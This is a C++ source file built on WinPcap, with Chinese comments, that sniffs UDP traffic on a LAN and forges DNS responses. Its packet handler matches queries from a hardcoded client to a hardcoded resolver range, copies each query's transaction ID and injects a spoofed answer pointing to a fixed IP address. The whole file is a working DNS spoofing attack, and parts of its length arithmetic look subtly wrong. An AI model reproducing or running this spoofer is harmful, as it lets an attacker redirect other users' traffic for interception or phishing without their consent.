// PcapTest.cpp : Defines the entry point for the console application.
#include "stdio.h"
//#include "pcap.h"
#include <pcap.h>
//#include <remote-ext.h>
//#include "remote-ext.h"
#include "winsock.h"
#include <string.h>
void packet_hander(u_char *param,const struct pcap_pkthdr *header,const u_char *pkt_data);
//4字节的IP地址
typedef struct ip_address
{
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
}ip_address;
//IP包头
typedef struct ip_header 
{
	u_char ver_ihl;    //版本 4bit + 首部长度 4bit
	u_char tos;        //服务类型8位
	u_short tlen;      //总长度 16位
	u_short identification;   //16位标识
	u_short flags_fo; //3位标志， 13位片偏移
	u_char ttl;       //8位存活时间 time to live
	u_char proto;     //8位协议
	u_short crc;      //16位首部检验和
	ip_address saddr; //32位源IP地址
	ip_address daddr; //32位目的IP地址
}ip_header;
//TCP包头部结构
typedef struct tcp_header {
	WORD SourPort;
	WORD DestPort;
	DWORD SeqNo;
	DWORD AckNo;
	BYTE Hlen;
	BYTE Flag;
	WORD WndSize;
	WORD ChkSum;
	WORD UrgPtr;
}tcp_header;
//TCP伪首部
typedef struct tcp_pseheader 
{
	ip_address saddr;
	ip_address daddr;
	u_char placeholder;
	u_char proto;
	WORD tcplength;
}tcp_pseheader;
//UDP头部结构
typedef struct udp_header 
{
	u_short sport; //源端口
	u_short dport; //目的端口
	u_short len;
	u_short crc;
}udp_header;
//UDP伪首部
typedef struct psd
{
	ip_address saddr;
	ip_address daddr;
	char           mbz;
	char           ptcl;
	unsigned short udpl;
}PSD,*PPSD;
//DNS结构
typedef struct dns
{
	unsigned short id;
	unsigned short flags;
	unsigned short quests;
	unsigned short answers;
	unsigned short author;
	unsigned short addition;
}DNS,*PDNS;
//DNS问题结构
typedef struct query
{
	unsigned short type;
	unsigned short classes;
}QUERY,*PQUERY;
//DNS回答结构
typedef struct response
{
	unsigned short name; 
	unsigned short type;
	unsigned short classes;
	unsigned short ttl1;
	unsigned short ttl2;
	unsigned short length;
	unsigned short addr1;
	unsigned short addr2;
}RESPONSE,*PRESPONSE;
typedef struct Author
{
	short name;
	short type;
	short Class;
	int ttl;
	short datalength;
};
pcap_t *adhandle;
int main(int argc,char **argv)
{
	pcap_if_t* alldevs;
	pcap_if_t* d;
	int i=0;
	int inum;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_int netmask;
	char packet_filter[]="ip and udp";
	struct bpf_program fcode;
	//获取本地机器设备列表
	//if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING,NULL,&alldevs,errbuf)==-1)
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr,"error in pcap_findalldevs_ex:%s\r\n",errbuf);
		printf("\r\n");
		
		return 0;
	}
	//打印列表
	for (d=alldevs;d;d=d->next)
	{
		printf("%d.%s\n",++i,d->name);
		printf("\r\n");
		if (d->description)
		{
			printf(("{%s}\n",d->description));
			printf("\r\n");
		}
		else
		{
			
			printf("{No description}\n}");
			printf("\r\n");
		}
	}
	if (i == 0)
	{
		printf("{\r\nNo interface found! Make sure WinPcap is install}");
		return 0;
		
	}
	printf("Enter the interface number{1-%d}:",i);
	scanf("%d",&inum);
	
	if (inum<1||inum>i)
	{
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return -1;
		
	}

	//跳转到选中的适配器
	for (d=alldevs,i=0;i<inum-1;d=d->next,i++);
	//if ((adhandle=pcap_open(d->name,65536,PCAP_OPENFLAG_PROMISCUOUS,1,NULL,errbuf))==NULL)
	//打开设备
	if ( (adhandle= pcap_open_live(d->name, // 设备名 
		65536,      // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容. 
		1,          // 混杂模式 
		1000,       // 读取超时时间 
		errbuf      // 错误缓冲池 
		) ) == NULL) 
	{
		fprintf(stderr,"\nUnable to open the adapter.%s is not supported by winpcap\n",d->name);
		pcap_freealldevs(alldevs);
		return -1;
		
	}
	//检查数据链路层，为了简单，我们只考虑以太网
	if (pcap_datalink(adhandle)!=DLT_EN10MB)
	{
		fprintf(stderr,"\nThis program works on Ethernet networks.\n");
		pcap_freealldevs(alldevs);
		return -1;		
	}
	if (d->addresses!=NULL)
	{
		netmask=((struct sockaddr_in*)(d->addresses->netmask))->sin_addr.S_un.S_addr;
	}
	else
	{
		netmask=0xffffff;
	}
	//编译过滤器
	if (pcap_compile(adhandle,&fcode,packet_filter,1,netmask)<0)
	{
		fprintf(stderr,"\nUnable to compile the packet filter. Check the syntax.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	//设置过滤器
	if (pcap_setfilter(adhandle,&fcode)<0)
	{
		fprintf(stderr,"\nError setting the filter.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	printf("\nlistening on %s...\n",d->description);
	//不再需要设备列表了，释放它
	pcap_freealldevs(alldevs);
	//开始捕捉
	pcap_loop(adhandle,0,packet_hander,NULL);
	
	return 0;
}
USHORT checksum(USHORT* buffer, int size)
{	
	unsigned long cksum = 0;
	while(size>1)	
	{
		cksum += *buffer++;	
		size -= sizeof(USHORT);	
	}
	if(size)		
	{
		
		cksum += *(UCHAR*)buffer;
		
	}	
	cksum = (cksum>>16) + (cksum&0xffff); 	
	cksum += (cksum>>16);             
	return (USHORT)(~cksum);
	
}
//typedef void(*) pcap_handler(u_char *user, const struct pcap_pkthdr *pkt_header, const u_char *pkt_data)  

//接收数据包的回调函数
//u_char *param,  不知干嘛的
//const struct pcap_pkthdr *header, 在转储文件中的包头
//const u_char *pkt_data  数据包内容
void packet_hander(u_char *param,const struct pcap_pkthdr *header,const u_char *pkt_data)     
{

	struct tm *ltime;
	char timestr[16];
	time_t local_tv_sec;
	u_char *newpacket=new u_char[500];  //创建包空间

	ip_header *oldipheader = (ip_header*)(pkt_data+14);  //IP首部20 去掉以太网首部14
	udp_header *udpoldheader = (udp_header*)(pkt_data+34); //UDP首部8 去掉以太网首部、IP首部
	dns *olddns = (dns*)(pkt_data+42); //DNS首部 去掉以太网首部、IP首部、UDP首部--除去查询问题和回答记录只有12字节即DNS结构头长度
	memset(newpacket,0,500);           //全部置零
	char temp[1024];
	int ulen=0;
	unsigned char *dname;

// 	local_tv_sec = header->ts.tv_sec;
// 	ltime = localtime(&local_tv_sec);
// 	strftime(timestr,sizeof(timestr),"%H:%M:%S",ltime);
// 	printf("%s\n",timestr);

    //192 168 0 96 源IP    192 168 30 124
	//202 102 224  目标IP  202 96 209 5/6
	if (oldipheader->saddr.byte1 == 192&&oldipheader->saddr.byte2 == 168&&oldipheader->saddr.byte3 == 0&&oldipheader->saddr.byte4 ==96&&oldipheader->daddr.byte1 == 202&&oldipheader->daddr.byte2
		== 102&&oldipheader->daddr.byte3 == 224) 
	{
		int packetlen = header->len+16;  //包长度加16字节
		int questlen = header->len-54;   //请求回复长度= 包长度-(14+20+8+12)  //去掉以太网首部、IP首部、UDP首部、DNS首部
		
		int sumindex = header->len;  //请求包长度
		ulen = ntohs(udpoldheader->len)-sizeof(udp_header)-sizeof(dns)-sizeof(query);
		dname = new u_char[ulen];
		memcpy(dname,pkt_data+14+20+sizeof(udp_header)+sizeof(dns),ulen);
		//IP包头
		ip_header *ipnewpack = new ip_header;
		ipnewpack->ver_ihl = oldipheader->ver_ihl;
		ipnewpack->tos = oldipheader->tos;
		ipnewpack->tlen = htons(20+sizeof(udp_header)+sizeof(dns)+ulen+sizeof(query)+16);
		ipnewpack->identification = htons(64528);
		ipnewpack->flags_fo = 0x0040;
		ipnewpack->ttl = 252;
		ipnewpack->proto = oldipheader->proto;
		ipnewpack->saddr = oldipheader->daddr;
		ipnewpack->daddr = oldipheader->saddr;
		ipnewpack->crc = 0;
		ipnewpack->crc = checksum((unsigned short*)ipnewpack,sizeof(ip_header));
		
		query *oldquery = (query*)(pkt_data+54+ulen);
		//UDP包头
		udp_header *udpnewheader = new udp_header;
		udpnewheader->dport = udpoldheader->sport;
		udpnewheader->sport = udpoldheader->dport;
		udpnewheader->len = htons(sizeof(udp_header)+sizeof(dns)+sizeof(query)+16+ulen);
		udpnewheader->crc = 0;
		psd *newpsdpacket = new psd;
		newpsdpacket->saddr = ipnewpack->saddr;
		newpsdpacket->daddr = ipnewpack->daddr;
		newpsdpacket->mbz = 0;
		newpsdpacket->ptcl = IPPROTO_UDP;
		newpsdpacket->udpl = htons(sizeof(udp_header)+ulen+sizeof(dns)+ulen+sizeof(query)+16);
		//DNS头
		dns *dnsnewpack = new dns;
		dnsnewpack->id = olddns->id;
		dnsnewpack->flags = htons(0x8180);
		dnsnewpack->quests = htons(1);
		dnsnewpack->answers = htons(1);
		dnsnewpack->author = htons(1);
		dnsnewpack->addition = 0;
		
		query *querynewpack = new query;
		querynewpack->classes = oldquery->classes;
		querynewpack->type = oldquery->type;
		//回答记录内容
		response *responsenewpack = new response;
		responsenewpack->name = htons(0xc00c);
		responsenewpack->type = oldquery->type;
		responsenewpack->classes = oldquery->classes;
		responsenewpack->ttl1 = htons(0xff);
		responsenewpack->ttl2 = htons(0xff);
		responsenewpack->length = htons(4);
		responsenewpack->addr1 = 0x873d;
		responsenewpack->addr2 = 0x69a9;

		Author *author = new Author;

		author->name = htons(0xc02f);
		author->type = htons(0x0002);
		author->Class = htons(0x0001);
		author->ttl = htonl(0x00000d90);
		author->datalength = htons(0x0006);
		u_char szBuffer[6];
		szBuffer[0] = 0x03;
		szBuffer[1] = 0x6e;
		szBuffer[2] = 0x73;
		szBuffer[3] = 0x32;
		szBuffer[4] = 0xc0;
		szBuffer[5] = 0x2f;


		
		memset(temp,0,1024);
		memcpy(temp,newpsdpacket,sizeof(psd));
		memcpy(temp+sizeof(psd),udpnewheader,sizeof(udp_header));
		memcpy(temp+sizeof(psd)+sizeof(udp_header),dnsnewpack,sizeof(dns));
		memcpy(temp+sizeof(psd)+sizeof(udp_header)+sizeof(dns),dname,ulen);
		memcpy(temp+sizeof(psd)+sizeof(udp_header)+sizeof(dns)+ulen,querynewpack,sizeof(query));
		memcpy(temp+sizeof(psd)+sizeof(udp_header)+sizeof(dns)+ulen+sizeof(query),responsenewpack,16);
		udpnewheader->crc = checksum((USHORT*)temp,sizeof(psd)+sizeof(udp_header)+sizeof(dns)+ulen+sizeof(query)+16);
		
		memset(newpacket,0,14);
		memcpy(newpacket,pkt_data+6,6);    //构造以太网包头
		memcpy(newpacket+6,pkt_data,6);
		memcpy(newpacket+12,pkt_data+12,2);  
		memcpy(newpacket+14,ipnewpack,sizeof(ip_header));   //构造IP包头
		memcpy(newpacket+34,udpnewheader,sizeof(udp_header));
		memcpy(newpacket+34+sizeof(udp_header),dnsnewpack,sizeof(dns));
		memcpy(newpacket+34+sizeof(udp_header)+sizeof(dns),dname,ulen);
		memcpy(newpacket+34+sizeof(udp_header)+sizeof(dns)+ulen,querynewpack,sizeof(query));
	    memcpy(newpacket+34+sizeof(udp_header)+sizeof(dns)+ulen+sizeof(query),responsenewpack,16);
		memcpy(newpacket+34+sizeof(udp_header)+sizeof(dns)+ulen+sizeof(query)+16, author, 12);
		memcpy(newpacket+34+sizeof(udp_header)+sizeof(dns)+ulen+sizeof(query)+16+12, szBuffer, 6);
		printf("old id:%x\tnew id:%x\n",olddns->id,dnsnewpack->id);
		
		printf("\n------------------------------------------------------------\n");
		
		if (pcap_sendpacket(adhandle,newpacket,34+sizeof(udp_header)+sizeof(dns)+ulen+sizeof(query)+16+12+6) != 0)
		{
			printf("\nError sending the packet:\n");
			return;
		}
	} 	

}